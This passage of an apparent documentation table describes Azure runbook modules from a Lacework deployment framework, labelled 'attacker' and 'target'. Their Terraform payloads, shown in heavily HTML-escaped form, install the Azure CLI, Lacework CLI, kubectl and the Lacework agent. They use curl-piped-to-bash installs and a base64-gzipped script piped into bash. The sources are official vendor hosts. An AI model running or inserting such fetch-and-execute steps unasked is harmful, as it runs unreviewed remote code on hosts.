                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-runbook-azure-cli                               | ./modules/runbook/deploy-azure-cli                   | runbook_deploy_azure_cli                         | context.azure.runbook.deploy_azure_cli                            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_azure_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-cli                   | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;az&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>        curl &amp;#45;sL https://aka&amp;#46;ms/InstallAzureCLIDeb &amp;#124; bash <br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/>    <br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| attacker-runbook-lacework-cli                            | ./modules/runbook/deploy-lacework-cli                | runbook_deploy_lacework_cli                      | context.azure.runbook.deploy_lacework_cli                         | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-cli                | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;lacework&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>        curl https://raw&amp;#46;githubusercontent&amp;#46;com/lacework/go&amp;#45;sdk/main/cli/install&amp;#46;sh &amp;#124; bash<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-runbook-kubectl-cli                             | ./modules/runbook/deploy-kubectl-cli                 | runbook_deploy_kubectl_cli                       | context.azure.runbook.deploy_kubectl_cli                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_kubectl_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-kubectl-cli                 | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;kubectl&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>        curl &amp;#45;LO &quot;https://storage&amp;#46;googleapis&amp;#46;com/kubernetes&amp;#45;release/release/$&amp;&amp;#35;40;curl &amp;#45;s https://storage&amp;#46;googleapis&amp;#46;com/kubernetes&amp;#45;release/release/stable&amp;#46;txt&amp;&amp;#35;41;/bin/linux/amd64/kubectl&quot;<br/>        sudo install &amp;#45;o root &amp;#45;g root &amp;#45;m 0755 kubectl /usr/local/bin/kubectl<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| target-runbook-deploy-lacework                           | ./modules/runbook/deploy-lacework-agent              | runbook_deploy_lacework                          | context.azure.runbook.deploy_lacework_agent                       | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-agent              | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;lacework&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Starting&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>        log &quot;lacework already installed &amp;#45; nothing to do&quot;<br/>    else<br/>        log &quot;lacework not installed &amp;#45; installing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        echo &#x27;$&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &amp;#124; /bin/bash &amp;#45;<br/>    fi<br/>    log &quot;done&amp;#46;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;#46;sh&quot;, &amp;&amp;#35;123;<br/>        LaceworkInstallPath=&quot;/var/lib/lacework&quot;<br/>        LaceworkTempPath=var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;temp&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>        Tags=jsonencode&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;tags&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>        Hash=&quot;&quot;<br/>        Serverurl=var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;server&amp;&amp;#35;95;url&quot;&amp;&amp;#35;93;<br/>        Token=try&amp;&amp;#35;40;length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;, &quot;false&quot;&amp;&amp;#35;41; &amp;#33;= &quot;false&quot; ? var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot;&amp;&amp;#35;93; : lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&amp;#46;agent&amp;&amp;#35;91;0&amp;&amp;#35;93;&amp;#46;token<br/>    &amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;<br/>        &amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;<br/><br/>&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;<br/>&amp;#35; LACEWORK AGENT<br/>&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;<br/><br/>resource &quot;random&amp;&amp;#35;95;string&quot; &quot;this&quot; &amp;&amp;#35;123;<br/>    length            = 4<br/>    special           = false<br/>    upper             = false<br/>    lower             = true<br/>    numeric           = true<br/>&amp;&amp;#35;125;<br/><br/>resource &quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot; &quot;agent&quot; &amp;&amp;#35;123;<br/>    count = try&amp;&amp;#35;40;length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;, &quot;false&quot;&amp;&amp;#35;41; &amp;#33;= &quot;false&quot; ? 0 : 1<br/>    name = &quot;endpoint&amp;#45;agent&amp;#45;access&amp;#45;token&amp;#45;$&amp;&amp;#35;123;random&amp;&amp;#35;95;string&amp;#46;this&amp;#46;id&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;environment&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;deployment&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        